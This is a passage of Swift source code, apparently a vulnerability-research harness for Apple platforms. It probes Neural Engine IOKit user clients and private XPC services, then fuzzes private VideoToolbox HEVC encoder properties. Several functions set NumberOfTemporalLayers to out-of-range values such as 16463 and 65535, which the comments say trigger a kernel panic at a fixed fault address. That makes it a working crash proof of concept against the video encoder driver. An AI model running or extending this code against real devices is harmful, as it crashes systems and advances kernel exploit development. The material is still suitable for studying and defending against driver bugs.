            emit("xfh: [\(kind)] req=\(reqText) frame=\(gotFrame.pointee) failed=\(gotFail.pointee) hash=\(String(format: "%016llx", hashOut.pointee)) \(same) dims=\(dimsOut.pointee)")
            active.pointee = nil
            xq_cancel(gc); xq_release(gc)
            xq_cancel(ac); xq_release(ac)
        }
        gotFrame.deallocate(); gotFail.deallocate(); hashOut.deallocate(); dimsOut.deallocate(); active.deallocate()
        emit("xfh: done")
    }

    func aneIokitProbe() {
        emit("xak: ANE IOKit reachability")

        func openMatching(_ cls: String) -> [io_service_t] {
            guard let match = cls.withCString({ xq_IOServiceMatching($0) }) else { return [] }
            var it: io_iterator_t = 0
            let kr = xq_IOServiceGetMatchingServices(0, match, &it)
            guard kr == KERN_SUCCESS else {
                emit("xak: match \(cls) kr=\(kr)")
                return []
            }
            var out: [io_service_t] = []
            while case let s = xq_IOIteratorNext(it), s != 0 {
                out.append(s)
            }
            xq_IOObjectRelease(it)
            return out
        }

        let candidates = [
            "AppleH13ANE", "AppleH13ANEHAL", "AppleH11ANEInterface",
            "AppleH13ANEInterface", "H11ANEIn", "AppleANE",
            "AppleH13ANELoader", "AppleT8150ANE"
        ]

        for cls in candidates {
            let svcs = openMatching(cls)
            emit("xak: class \(cls) found=\(svcs.count)")
            for s in svcs {
                var nameBuf = [CChar](repeating: 0, count: 128)
                xq_IORegistryEntryGetName(s, &nameBuf)
                let name = String(cString: nameBuf)
                var props: Unmanaged<CFMutableDictionary>?
                let pkr = xq_IORegistryEntryCreateCFProperties(s, &props, kCFAllocatorDefault, 0)
                var propText = ""
                if pkr == KERN_SUCCESS, let dict = props?.takeRetainedValue() as? [String: Any] {
                    let keys = dict.keys.sorted().prefix(12).joined(separator: ",")
                    propText = " props=[\(keys)]"
                }
                var conn: io_connect_t = 0
                let okr = xq_IOServiceOpen(s, mach_task_self_, 0, &conn)
                emit("xak: svc \(name) open(type0) kr=\(okr)\(propText)")
                if okr == KERN_SUCCESS {
                    var scalar: UInt64 = 0
                    var outCnt: UInt32 = 1
                    let ckr = xq_IOConnectCallScalarMethod(conn, 0, nil, 0, &scalar, &outCnt)
                    emit("xak:   call0 kr=\(ckr) out=\(scalar)")
                    xq_IOServiceClose(conn)
                }
                xq_IOObjectRelease(s)
            }
        }

        // Also try opening by untyped match on the whole service plane.
        let aneLike = openMatching("IOService")
        emit("xak: IOService total=\(aneLike.count)")
        for s in aneLike {
            var nameBuf = [CChar](repeating: 0, count: 128)
            xq_IORegistryEntryGetName(s, &nameBuf)
            let name = String(cString: nameBuf)
            if name.contains("ANE") {
                var conn: io_connect_t = 0
                let okr = xq_IOServiceOpen(s, mach_task_self_, 0, &conn)
                emit("xak: ane-named \(name) open kr=\(okr)")
                if okr == KERN_SUCCESS { xq_IOServiceClose(conn) }
            }
            xq_IOObjectRelease(s)
        }
        emit("xak: done")
    }

    func aneTypesProbe() {
        emit("xat: ANE user client types")

        func names(_ cls: String) -> [(io_service_t, String)] {
            guard let match = cls.withCString({ xq_IOServiceMatching($0) }) else { return [] }
            var it: io_iterator_t = 0
            let kr = xq_IOServiceGetMatchingServices(0, match, &it)
            guard kr == KERN_SUCCESS else { return [] }
            var out: [(io_service_t, String)] = []
            while case let s = xq_IOIteratorNext(it), s != 0 {
                var buf = [CChar](repeating: 0, count: 128)
                xq_IORegistryEntryGetName(s, &buf)
                out.append((s, String(cString: buf)))
            }
            xq_IOObjectRelease(it)
            return out
        }

        var targets: [(io_service_t, String)] = []
        for cls in ["H11ANEIn", "AppleT8150ANEHAL", "AppleH13ANEInterface"] {
            let list = names(cls)
            for (s, n) in list { targets.append((s, "\(cls)/\(n)")) }
        }
        emit("xat: targets=\(targets.count)")

        for (svc, label) in targets {
            var props: Unmanaged<CFMutableDictionary>?
            if xq_IORegistryEntryCreateCFProperties(svc, &props, kCFAllocatorDefault, 0) == KERN_SUCCESS,
               let dict = props?.takeRetainedValue() as? [String: Any] {
                let keys = dict.keys.sorted().joined(separator: ",")
                emit("xat: \(label) props=[\(keys)]")
                if let dp = dict["DeviceProperties"] as? [String: Any] {
                    let dk = dp.keys.sorted().prefix(10).joined(separator: ",")
                    emit("xat:   DeviceProperties=[\(dk)]")
                }
            }
            for type in UInt32(0)...UInt32(7) {
                var conn: io_connect_t = 0
                let kr = xq_IOServiceOpen(svc, mach_task_self_, type, &conn)
                emit("xat: \(label) type=\(type) kr=\(kr)" + (kr == KERN_SUCCESS ? " OPEN" : ""))
                if kr == KERN_SUCCESS {
                    var scalar: UInt64 = 0
                    var outCnt: UInt32 = 1
                    let ckr = xq_IOConnectCallScalarMethod(conn, 0, nil, 0, &scalar, &outCnt)
                    emit("xat:   call0 kr=\(ckr) out=\(scalar)")
                    xq_IOServiceClose(conn)
                }
            }
            xq_IOObjectRelease(svc)
        }
        emit("xat: done")
    }

    func aneServicesProbe() {
        emit("xas: ANE mach services reachability")
        let names = [
            "com.apple.aned",
            "com.apple.aned.private",
            "com.apple.aned.user",
            "com.apple.appleane",
            "com.apple.ANECompilerService",
            "com.apple.anecompiler",
            "com.apple.coreml.compiler",
            "com.apple.espresso",
            "com.apple.espresso.compiler",
            "com.apple.appleneuralengine",
            "com.apple.aneuserd",
            "com.apple.hid.ane"
        ]
        for name in names {
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else {
                emit("xas: \(name) create=null")
                continue
            }
            let done = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
            let gotReply = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
            done.pointee = false; gotReply.pointee = false
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                let d = self.describe(e)
                if let err = "XPCErrorDescription".withCString({ xq_dictionary_get_string(e, $0) }) {
                    emit("xas: \(name) error=\(String(cString: err))")
                } else {
                    gotReply.pointee = true
                    emit("xas: \(name) reply=\(d.prefix(80))")
                }
                done.pointee = true
            }
            xq_resume(c)
            if let m = xq_dictionary_create(nil, nil, 0) {
                "probe".withCString { xq_dictionary_set_uint64(m, $0, 1) }
                _ = m
                xq_release(m)
            }
            let deadline = Date().addingTimeInterval(1.5)
            while !done.pointee && Date() < deadline {
                Thread.sleep(forTimeInterval: 0.05)
            }
            emit("xas: \(name) reachable=\(gotReply.pointee)")
            xq_cancel(c)
            xq_release(c)
            done.deallocate(); gotReply.deallocate()
        }
        emit("xas: done")
    }

    func svePropsProbe() {
        emit("xsv: SVE encoder properties")
        let w = 640, h = 360
        var session: VTCompressionSession?
        let spec: [String: Any] = [
            "EnableHardwareAcceleratedVideoEncoder": true
        ]
        let st = VTCompressionSessionCreate(
            allocator: kCFAllocatorDefault,
            width: Int32(w), height: Int32(h),
            codecType: kCMVideoCodecType_HEVC,
            encoderSpecification: spec as CFDictionary,
            imageBufferAttributes: nil,
            compressedDataAllocator: nil,
            outputCallback: nil,
            refcon: nil,
            compressionSessionOut: &session)
        emit("xsv: create status=\(st) session=\(session != nil)")
        guard let s = session else { emit("xsv: no session"); return }

        let keys: [(String, Any)] = [
            ("SVENum", 1),
            ("SVESchedMode", 7),
            ("SVEMap", 0),
            ("EnableSVE", 1),
            ("SVEEnabled", 1),
        ]
        for (k, v) in keys {
            let r = VTSessionSetProperty(s, key: k as CFString, value: v as CFTypeRef)
            emit("xsv: set \(k)=\(v) -> \(r)")
        }
        let r1 = VTSessionSetProperty(s, key: kVTCompressionPropertyKey_RealTime, value: kCFBooleanTrue)
        emit("xsv: RealTime -> \(r1)")
        let r2 = VTSessionSetProperty(s, key: kVTCompressionPropertyKey_ProfileLevel,
                                      value: kVTProfileLevel_HEVC_Main_AutoLevel)
        emit("xsv: ProfileLevel -> \(r2)")

        let prep = VTCompressionSessionPrepareToEncodeFrames(s)
        emit("xsv: prepare=\(prep)")

        var encoded = 0
        for i in 0..<4 {
            var pb: CVPixelBuffer?
            let attrs: [String: Any] = [kCVPixelBufferIOSurfacePropertiesKey as String: [:] as [String: Any]]
            CVPixelBufferCreate(kCFAllocatorDefault, w, h, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                attrs as CFDictionary, &pb)
            guard let buf = pb else { emit("xsv: no pixelbuffer"); break }
            var flagsOut: VTEncodeInfoFlags = []
            let er = VTCompressionSessionEncodeFrame(
                s,
                imageBuffer: buf,
                presentationTimeStamp: CMTime(value: CMTimeValue(i * 1001), timescale: 24000),
                duration: CMTime(value: 1001, timescale: 24000),
                frameProperties: nil,
                sourceFrameRefcon: nil,
                infoFlagsOut: &flagsOut)
            encoded += 1
            emit("xsv: encode[\(i)] status=\(er)")
            if er != noErr { break }
        }
        VTCompressionSessionCompleteFrames(s, untilPresentationTimeStamp: .invalid)
        emit("xsv: frames submitted=\(encoded)")
        VTCompressionSessionInvalidate(s)
        emit("xsv: done")
    }

    func dpbPropsProbe() {
        emit("xdp: DPB-related encoder properties")
        let w = 640, h = 360
        var session: VTCompressionSession?
        let spec: [String: Any] = ["EnableHardwareAcceleratedVideoEncoder": true]
        let st = VTCompressionSessionCreate(
            allocator: kCFAllocatorDefault,
            width: Int32(w), height: Int32(h),
            codecType: kCMVideoCodecType_HEVC,
            encoderSpecification: spec as CFDictionary,
            imageBufferAttributes: nil,
            compressedDataAllocator: nil,
            outputCallback: nil,
            refcon: nil,
            compressionSessionOut: &session)
        emit("xdp: create=\(st)")
        guard let s = session else { return }

        // 1. Which DPB-ish keys does the encoder accept at all?
        let probes: [(String, Any)] = [
            ("UserDPBFramesForFaceTime", 16),
            ("UserDPBFramesForFaceTime", 24),
            ("DPBRequirements", 4),
            ("DPBElem", 4),
            ("EncoderUsage", 16),
            ("RCMode", 20),
            ("NumTemporalLayers", 4),
            ("EnableTemporalScalability", 1),
            ("TemporalLayerCount", 4),
        ]
        var acceptedDPB: (String, Any)?
        for (k, v) in probes {
            let r = VTSessionSetProperty(s, key: k as CFString, value: v as CFTypeRef)
            emit("xdp: \(k)=\(v) -> \(r)")
            if r == 0 && acceptedDPB == nil && k.contains("DPB") { acceptedDPB = (k, v) }
        }

        // 2. Encode with whatever DPB key was accepted.
        if let (k, v) = acceptedDPB {
            let again = VTSessionSetProperty(s, key: k as CFString, value: v as CFTypeRef)
            emit("xdp: reapply \(k)=\(v) -> \(again)")
        } else {
            emit("xdp: no DPB key accepted")
        }
        _ = VTCompressionSessionPrepareToEncodeFrames(s)
        var ok = 0
        for i in 0..<6 {
            var pb: CVPixelBuffer?
            let attrs: [String: Any] = [kCVPixelBufferIOSurfacePropertiesKey as String: [:] as [String: Any]]
            CVPixelBufferCreate(kCFAllocatorDefault, w, h, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                attrs as CFDictionary, &pb)
            guard let buf = pb else { break }
            var flags: VTEncodeInfoFlags = []
            let er = VTCompressionSessionEncodeFrame(
                s, imageBuffer: buf,
                presentationTimeStamp: CMTime(value: CMTimeValue(i * 1001), timescale: 24000),
                duration: CMTime(value: 1001, timescale: 24000),
                frameProperties: nil, sourceFrameRefcon: nil, infoFlagsOut: &flags)
            if er == noErr { ok += 1 } else { emit("xdp: encode[\(i)] err=\(er)"); break }
        }
        VTCompressionSessionCompleteFrames(s, untilPresentationTimeStamp: .invalid)
        emit("xdp: submitted=\(ok)")
        VTCompressionSessionInvalidate(s)
        emit("xdp: done")
    }

    func specPathProbe() {
        emit("xsp: private keys via encoderSpecification and AVAssetWriter")
        let priv: [String: Any] = [
            "EncoderUsage": 16,
            "RCMode": 20,
            "UserDPBFramesForFaceTime": 16,
            "SVENum": 1,
            "SVESchedMode": 7,
            "NumTemporalLayers": 4
        ]
        let w = 640, h = 360

        // --- Path A: encoderSpecification at session creation.
        for (label, spec) in [("spec-bare", ["EnableHardwareAcceleratedVideoEncoder": true]),
                              ("spec-private", ["EnableHardwareAcceleratedVideoEncoder": true].merging(priv) { a, _ in a })] {
            var session: VTCompressionSession?
            let st = VTCompressionSessionCreate(
                allocator: kCFAllocatorDefault,
                width: Int32(w), height: Int32(h),
                codecType: kCMVideoCodecType_HEVC,
                encoderSpecification: spec as CFDictionary,
                imageBufferAttributes: nil, compressedDataAllocator: nil,
                outputCallback: nil, refcon: nil, compressionSessionOut: &session)
            emit("xsp: [\(label)] create=\(st) session=\(session != nil)")
            guard let s = session else { continue }
            _ = VTCompressionSessionPrepareToEncodeFrames(s)
            var ok = 0
            for i in 0..<4 {
                var pb: CVPixelBuffer?
                let attrs: [String: Any] = [kCVPixelBufferIOSurfacePropertiesKey as String: [:] as [String: Any]]
                CVPixelBufferCreate(kCFAllocatorDefault, w, h, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                    attrs as CFDictionary, &pb)
                guard let buf = pb else { break }
                var flags: VTEncodeInfoFlags = []
                let er = VTCompressionSessionEncodeFrame(
                    s, imageBuffer: buf,
                    presentationTimeStamp: CMTime(value: CMTimeValue(i * 1001), timescale: 24000),
                    duration: CMTime(value: 1001, timescale: 24000),
                    frameProperties: nil, sourceFrameRefcon: nil, infoFlagsOut: &flags)
                if er == noErr { ok += 1 } else { emit("xsp: [\(label)] enc[\(i)] err=\(er)"); break }
            }
            VTCompressionSessionCompleteFrames(s, untilPresentationTimeStamp: .invalid)
            emit("xsp: [\(label)] submitted=\(ok)")
            VTCompressionSessionInvalidate(s)
        }

        // --- Path B: AVAssetWriter with private compression properties.
        let url = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("spec_test.mp4")
        try? FileManager.default.removeItem(at: url)
        do {
            let writer = try AVAssetWriter(outputURL: url, fileType: .mp4)
            var comp: [String: Any] = [
                AVVideoAverageBitRateKey: 2_000_000,
                AVVideoProfileLevelKey: kVTProfileLevel_HEVC_Main_AutoLevel as String
            ]
            for (k, v) in priv { comp[k] = v }
            let settings: [String: Any] = [
                AVVideoCodecKey: AVVideoCodecType.hevc,
                AVVideoWidthKey: w,
                AVVideoHeightKey: h,
                AVVideoCompressionPropertiesKey: comp
            ]
            let input = AVAssetWriterInput(mediaType: .video, outputSettings: settings)
            input.expectsMediaDataInRealTime = false
            let adaptor = AVAssetWriterInputPixelBufferAdaptor(
                assetWriterInput: input,
                sourcePixelBufferAttributes: [
                    kCVPixelBufferPixelFormatTypeKey as String: kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                    kCVPixelBufferWidthKey as String: w,
                    kCVPixelBufferHeightKey as String: h
                ])
            guard writer.canAdd(input) else { emit("xsp: writer cannot add input"); return }
            writer.add(input)
            emit("xsp: writer start=\(writer.startWriting())")
            writer.startSession(atSourceTime: .zero)
            var appended = 0
            for i in 0..<4 {
                var pb: CVPixelBuffer?
                let attrs: [String: Any] = [kCVPixelBufferIOSurfacePropertiesKey as String: [:] as [String: Any]]
                CVPixelBufferCreate(kCFAllocatorDefault, w, h, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                    attrs as CFDictionary, &pb)
                guard let buf = pb else { break }
                var tries = 0
                while !input.isReadyForMoreMediaData && tries < 40 { Thread.sleep(forTimeInterval: 0.02); tries += 1 }
                if adaptor.append(buf, withPresentationTime: CMTime(value: CMTimeValue(i * 1001), timescale: 24000)) {
                    appended += 1
                } else {
                    emit("xsp: append[\(i)] failed \(String(describing: writer.error))")
                    break
                }
            }
            input.markAsFinished()
            let sem = DispatchSemaphore(value: 0)
            writer.finishWriting { sem.signal() }
            _ = sem.wait(timeout: .now() + 10)
            emit("xsp: writer status=\(writer.status.rawValue) appended=\(appended)")
            if let e = writer.error { emit("xsp: writer error=\(e.localizedDescription)") }
        } catch {
            emit("xsp: writer threw \(error.localizedDescription)")
        }
        emit("xsp: done")
    }

    func ntlProbe() {
        emit("xnt: NumberOfTemporalLayers acceptance")
        var session: VTCompressionSession?
        let spec: [String: Any] = ["EnableHardwareAcceleratedVideoEncoder": true]
        let st = VTCompressionSessionCreate(
            allocator: kCFAllocatorDefault, width: 640, height: 360,
            codecType: kCMVideoCodecType_HEVC,
            encoderSpecification: spec as CFDictionary,
            imageBufferAttributes: nil, compressedDataAllocator: nil,
            outputCallback: nil, refcon: nil, compressionSessionOut: &session)
        emit("xnt: create=\(st)")
        guard let s = session else { return }

        for key in ["NumberOfTemporalLayers", "NumTemporalLayers",
                    "EncoderUsage", "RCMode", "EnableTemporalScalability"] {
            let r = VTSessionSetProperty(s, key: key as CFString, value: 4 as CFTypeRef)
            emit("xnt: \(key)=4 -> \(r)")
        }
        // Safe NTL ladder: does the driver accept larger counts?
        for v in [1, 3, 4, 8, 16] {
            let r = VTSessionSetProperty(s, key: "NumberOfTemporalLayers" as CFString, value: v as CFTypeRef)
            emit("xnt: NTL=\(v) -> \(r)")
        }
        let prep = VTCompressionSessionPrepareToEncodeFrames(s)
        emit("xnt: prepare=\(prep)")
        var ok = 0
        for i in 0..<3 {
            var pb: CVPixelBuffer?
            let attrs: [String: Any] = [kCVPixelBufferIOSurfacePropertiesKey as String: [:] as [String: Any]]
            CVPixelBufferCreate(kCFAllocatorDefault, 640, 360, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                attrs as CFDictionary, &pb)
            guard let buf = pb else { break }
            var flags: VTEncodeInfoFlags = []
            let er = VTCompressionSessionEncodeFrame(
                s, imageBuffer: buf,
                presentationTimeStamp: CMTime(value: CMTimeValue(i * 1001), timescale: 24000),
                duration: CMTime(value: 1001, timescale: 24000),
                frameProperties: nil, sourceFrameRefcon: nil, infoFlagsOut: &flags)
            if er == noErr { ok += 1 } else { emit("xnt: enc[\(i)] err=\(er)"); break }
        }
        VTCompressionSessionCompleteFrames(s, untilPresentationTimeStamp: .invalid)
        emit("xnt: submitted=\(ok)")
        VTCompressionSessionInvalidate(s)
        emit("xnt: done")
    }

    func propSurfaceProbe() {
        emit("xpf: encoder property surface")
        var session: VTCompressionSession?
        let spec: [String: Any] = ["EnableHardwareAcceleratedVideoEncoder": true]
        let st = VTCompressionSessionCreate(
            allocator: kCFAllocatorDefault, width: 640, height: 360,
            codecType: kCMVideoCodecType_HEVC,
            encoderSpecification: spec as CFDictionary,
            imageBufferAttributes: nil, compressedDataAllocator: nil,
            outputCallback: nil, refcon: nil, compressionSessionOut: &session)
        emit("xpf: create=\(st)")
        guard let s = session else { return }

        var candidates: [(String, Any)] = [
            ("NumberOfTemporalLayers", 1),
            ("NumTemporalLayers", 1),
            ("EncoderUsage", 1),
            ("RCMode", 1),
            ("UserDPBFramesForFaceTime", 4),
            ("DPBRequirements", 4),
            ("DPBElem", 4),
            ("EnableSVE", 1),
            ("SVENum", 1),
            ("SVESchedMode", 1),
            ("SVEMap", 1),
            ("SVESlice", 1),
            ("SVEBitrate", 1000000),
            ("EnableLayeredEncoding", 1),
            ("NumberOfLayers", 1),
            ("LayerIDs", 1),
            ("BaseLayerFrameRate", 24),
            ("TemporalLayerFrameRate", 24),
            ("EnableMultiPassEncoding", 1),
            ("MultiPassStorage", 1),
            ("EnableQPModulation", 1),
            ("QPModulation", 1),
            ("EnableIntraRefresh", 1),
            ("IntraRefreshPeriod", 32),
            ("EnableVUI", 1),
            ("VideoFullRangeFlag", 0),
            ("BFrameCount", 2),
            ("MaxBFrames", 2),
            ("EnableOpenGOP", 1),
            ("ChromaQPOffset", 0),
            ("PreferSoftwareEncoder", 0),
            ("RequireHardwareEncoder", 1),
            ("Usage", 1),
            ("Quality", 0.7),
            ("TargetQualityForAlpha", 0.7),
            ("ExpectedFrameRate", 24),
            ("SourceFrameCount", 8),
            ("MaxKeyFrameInterval", 24),
            ("AllowTemporalCompression", 1),
        ]
        var accepted: [String] = []
        for (k, v) in candidates {
            let r = VTSessionSetProperty(s, key: k as CFString, value: v as CFTypeRef)
            if r == 0 { accepted.append(k) }
            emit("xpf: \(k) -> \(r)")
        }
        emit("xpf: accepted \(accepted.count)/\(candidates.count): \(accepted.joined(separator: ","))")
        VTCompressionSessionInvalidate(s)
        emit("xpf: done")
    }

    func propSurface2Probe() {
        emit("xp2: ordered property surface")
        var session: VTCompressionSession?
        let spec: [String: Any] = ["EnableHardwareAcceleratedVideoEncoder": true]
        let st = VTCompressionSessionCreate(
            allocator: kCFAllocatorDefault, width: 640, height: 360,
            codecType: kCMVideoCodecType_HEVC,
            encoderSpecification: spec as CFDictionary,
            imageBufferAttributes: nil, compressedDataAllocator: nil,
            outputCallback: nil, refcon: nil, compressionSessionOut: &session)
        emit("xp2: create=\(st)")
        guard let s = session else { return }

        func set(_ k: String, _ v: Any) -> Int32 {
            let r = VTSessionSetProperty(s, key: k as CFString, value: v as CFTypeRef)
            emit("xp2: \(k)=\(v) -> \(r)")
            return r
        }

        // PoC order: EncoderUsage first, then RCMode.
        _ = set("EncoderUsage", 1)
        _ = set("RCMode", 20)
        _ = set("RCMode", 0)
        _ = set("NumberOfTemporalLayers", 1)
        _ = set("BaseLayerFrameRate", 24)

        // Remaining candidates, skipping MultiPassStorage (needs an object).
        let rest: [(String, Any)] = [
            ("EnableQPModulation", 1),
            ("QPModulation", 1),
            ("EnableIntraRefresh", 1),
            ("IntraRefreshPeriod", 32),
            ("EnableVUI", 1),
            ("VideoFullRangeFlag", 0),
            ("BFrameCount", 2),
            ("MaxBFrames", 2),
            ("EnableOpenGOP", 1),
            ("ChromaQPOffset", 0),
            ("PreferSoftwareEncoder", 0),
            ("RequireHardwareEncoder", 1),
            ("Usage", 1),
            ("Quality", 0.7),
            ("ExpectedFrameRate", 24),
            ("SourceFrameCount", 8),
            ("MaxKeyFrameInterval", 24),
            ("AllowTemporalCompression", 1),
            ("EnableStats", 0),
            ("Priority", 1),
        ]
        var accepted: [String] = []
        for (k, v) in rest where set(k, v) == 0 { accepted.append(k) }
        emit("xp2: accepted-rest \(accepted.count)/\(rest.count): \(accepted.joined(separator: ","))")

        let prep = VTCompressionSessionPrepareToEncodeFrames(s)
        emit("xp2: prepare=\(prep)")
        var ok = 0
        for i in 0..<3 {
            var pb: CVPixelBuffer?
            let attrs: [String: Any] = [kCVPixelBufferIOSurfacePropertiesKey as String: [:] as [String: Any]]
            CVPixelBufferCreate(kCFAllocatorDefault, 640, 360, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                attrs as CFDictionary, &pb)
            guard let buf = pb else { break }
            var flags: VTEncodeInfoFlags = []
            let er = VTCompressionSessionEncodeFrame(
                s, imageBuffer: buf,
                presentationTimeStamp: CMTime(value: CMTimeValue(i * 1001), timescale: 24000),
                duration: CMTime(value: 1001, timescale: 24000),
                frameProperties: nil, sourceFrameRefcon: nil, infoFlagsOut: &flags)
            if er == noErr { ok += 1 } else { emit("xp2: enc[\(i)] err=\(er)"); break }
        }
        VTCompressionSessionCompleteFrames(s, untilPresentationTimeStamp: .invalid)
        emit("xp2: submitted=\(ok)")
        VTCompressionSessionInvalidate(s)
        emit("xp2: done")
    }

    func ntlLadderProbe() {
        emit("xnl: NTL ladder, fresh session per rung")
        // Safe rungs first: a panic ends the run.
        let rungs: [Int] = [1, 7, 13, 15]
        for ntl in rungs {
            var session: VTCompressionSession?
            let spec: [String: Any] = ["EnableHardwareAcceleratedVideoEncoder": true]
            let st = VTCompressionSessionCreate(
                allocator: kCFAllocatorDefault, width: 640, height: 360,
                codecType: kCMVideoCodecType_HEVC,
                encoderSpecification: spec as CFDictionary,
                imageBufferAttributes: nil, compressedDataAllocator: nil,
                outputCallback: nil, refcon: nil, compressionSessionOut: &session)
            emit("xnl: [ntl=\(ntl)] create=\(st)")
            guard let s = session else { continue }
            let r1 = VTSessionSetProperty(s, key: "EncoderUsage" as CFString, value: 1 as CFTypeRef)
            let r2 = VTSessionSetProperty(s, key: "NumberOfTemporalLayers" as CFString, value: ntl as CFTypeRef)
            emit("xnl: [ntl=\(ntl)] EncoderUsage=\(r1) NTL=\(r2)")
            let prep = VTCompressionSessionPrepareToEncodeFrames(s)
            emit("xnl: [ntl=\(ntl)] prepare=\(prep)")
            var ok = 0
            for i in 0..<2 {
                var pb: CVPixelBuffer?
                let attrs: [String: Any] = [kCVPixelBufferIOSurfacePropertiesKey as String: [:] as [String: Any]]
                CVPixelBufferCreate(kCFAllocatorDefault, 640, 360, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                    attrs as CFDictionary, &pb)
                guard let buf = pb else { break }
                var flags: VTEncodeInfoFlags = []
                let er = VTCompressionSessionEncodeFrame(
                    s, imageBuffer: buf,
                    presentationTimeStamp: CMTime(value: CMTimeValue(i * 1001), timescale: 24000),
                    duration: CMTime(value: 1001, timescale: 24000),
                    frameProperties: nil, sourceFrameRefcon: nil, infoFlagsOut: &flags)
                if er == noErr { ok += 1 } else { emit("xnl: [ntl=\(ntl)] enc[\(i)] err=\(er)"); break }
            }
            VTCompressionSessionCompleteFrames(s, untilPresentationTimeStamp: .invalid)
            emit("xnl: [ntl=\(ntl)] submitted=\(ok)")
            VTCompressionSessionInvalidate(s)
        }
        emit("xnl: done")
    }

    func ntlBoundaryProbe() {
        emit("xnb: NTL boundary 16462 vs 16463")
        // 16462 is expected to survive; 16463 is expected to panic.
        for ntl in [16462, 16463] {
            var session: VTCompressionSession?
            let spec: [String: Any] = ["EnableHardwareAcceleratedVideoEncoder": true]
            let st = VTCompressionSessionCreate(
                allocator: kCFAllocatorDefault, width: 640, height: 360,
                codecType: kCMVideoCodecType_HEVC,
                encoderSpecification: spec as CFDictionary,
                imageBufferAttributes: nil, compressedDataAllocator: nil,
                outputCallback: nil, refcon: nil, compressionSessionOut: &session)
            emit("xnb: [ntl=\(ntl)] create=\(st)")
            guard let s = session else { continue }
            let r1 = VTSessionSetProperty(s, key: "EncoderUsage" as CFString, value: 1 as CFTypeRef)
            let r2 = VTSessionSetProperty(s, key: "NumberOfTemporalLayers" as CFString, value: ntl as CFTypeRef)
            emit("xnb: [ntl=\(ntl)] EncoderUsage=\(r1) NTL=\(r2)")
            let prep = VTCompressionSessionPrepareToEncodeFrames(s)
            emit("xnb: [ntl=\(ntl)] prepare=\(prep)")
            var pb: CVPixelBuffer?
            let attrs: [String: Any] = [kCVPixelBufferIOSurfacePropertiesKey as String: [:] as [String: Any]]
            CVPixelBufferCreate(kCFAllocatorDefault, 640, 360, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                attrs as CFDictionary, &pb)
            if let buf = pb {
                var flags: VTEncodeInfoFlags = []
                emit("xnb: [ntl=\(ntl)] encoding now")
                let er = VTCompressionSessionEncodeFrame(
                    s, imageBuffer: buf,
                    presentationTimeStamp: CMTime(value: 0, timescale: 24000),
                    duration: CMTime(value: 1001, timescale: 24000),
                    frameProperties: nil, sourceFrameRefcon: nil, infoFlagsOut: &flags)
                emit("xnb: [ntl=\(ntl)] encode returned \(er)")
            }
            VTCompressionSessionCompleteFrames(s, untilPresentationTimeStamp: .invalid)
            emit("xnb: [ntl=\(ntl)] completed")
            VTCompressionSessionInvalidate(s)
        }
        emit("xnb: done")
    }

    func ntlFarProbe() {
        emit("xnf: does the fault address depend on NTL")
        // 65535 first: if the address is fixed, this still faults at 0x59.
        // 16463 afterwards confirms the harness if 65535 survives.
        for ntl in [65535, 16463] {
            var session: VTCompressionSession?
            let spec: [String: Any] = ["EnableHardwareAcceleratedVideoEncoder": true]
            let st = VTCompressionSessionCreate(
                allocator: kCFAllocatorDefault, width: 640, height: 360,
                codecType: kCMVideoCodecType_HEVC,
                encoderSpecification: spec as CFDictionary,
                imageBufferAttributes: nil, compressedDataAllocator: nil,
                outputCallback: nil, refcon: nil, compressionSessionOut: &session)
            emit("xnf: [ntl=\(ntl)] create=\(st)")
            guard let s = session else { continue }
            _ = VTSessionSetProperty(s, key: "EncoderUsage" as CFString, value: 1 as CFTypeRef)
            let r2 = VTSessionSetProperty(s, key: "NumberOfTemporalLayers" as CFString, value: ntl as CFTypeRef)
            emit("xnf: [ntl=\(ntl)] NTL set=\(r2)")
            _ = VTCompressionSessionPrepareToEncodeFrames(s)
            var pb: CVPixelBuffer?
            let attrs: [String: Any] = [kCVPixelBufferIOSurfacePropertiesKey as String: [:] as [String: Any]]
            CVPixelBufferCreate(kCFAllocatorDefault, 640, 360, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                attrs as CFDictionary, &pb)
            if let buf = pb {
                var flags: VTEncodeInfoFlags = []
                emit("xnf: [ntl=\(ntl)] encoding")
                let er = VTCompressionSessionEncodeFrame(
                    s, imageBuffer: buf,
                    presentationTimeStamp: CMTime(value: 0, timescale: 24000),
                    duration: CMTime(value: 1001, timescale: 24000),
                    frameProperties: nil, sourceFrameRefcon: nil, infoFlagsOut: &flags)
                emit("xnf: [ntl=\(ntl)] encode returned \(er)")
            }
            _ = VTCompressionSessionCompleteFrames(s, untilPresentationTimeStamp: .invalid)
            emit("xnf: [ntl=\(ntl)] survived")
            VTCompressionSessionInvalidate(s)
        }
        emit("xnf: done")
    }

    func ntlLenProbe() {
        let target = 30000
        emit("xnv: NTL length probe ntl=\(target)")
        var session: VTCompressionSession?
        let spec: [String: Any] = ["EnableHardwareAcceleratedVideoEncoder": true]
        let st = VTCompressionSessionCreate(
            allocator: kCFAllocatorDefault, width: 640, height: 360,
            codecType: kCMVideoCodecType_HEVC,
            encoderSpecification: spec as CFDictionary,
            imageBufferAttributes: nil, compressedDataAllocator: nil,
            outputCallback: nil, refcon: nil, compressionSessionOut: &session)
        emit("xnv: create=\(st)")
        guard let s = session else { return }
        _ = VTSessionSetProperty(s, key: "EncoderUsage" as CFString, value: 1 as CFTypeRef)
        let r2 = VTSessionSetProperty(s, key: "NumberOfTemporalLayers" as CFString, value: target as CFTypeRef)
        emit("xnv: NTL set=\(r2)")
        _ = VTCompressionSessionPrepareToEncodeFrames(s)
        var pb: CVPixelBuffer?
        let attrs: [String: Any] = [kCVPixelBufferIOSurfacePropertiesKey as String: [:] as [String: Any]]
